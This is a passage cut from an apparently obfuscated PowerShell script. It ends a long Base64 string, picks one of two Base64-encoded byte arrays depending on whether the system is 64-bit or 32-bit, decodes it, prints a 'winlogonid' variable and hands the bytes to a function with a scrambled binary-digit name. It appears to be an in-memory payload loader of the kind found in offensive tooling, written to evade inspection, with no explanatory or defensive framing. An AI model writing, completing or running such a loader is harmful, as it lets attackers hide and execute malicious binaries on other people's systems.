AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQA9AA==')))
 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]${_00110111011010011} = [Byte[]][Convert]::FromBase64String(${10101111101111111})
 }
 else
 {
   [Byte[]]${_00110111011010011} = [Byte[]][Convert]::FromBase64String(${01010101001110101})
 }
 Write-Host $winlogonid
 _10001011000101101 -_00110111011010011 ${_00110111011010011}
 }
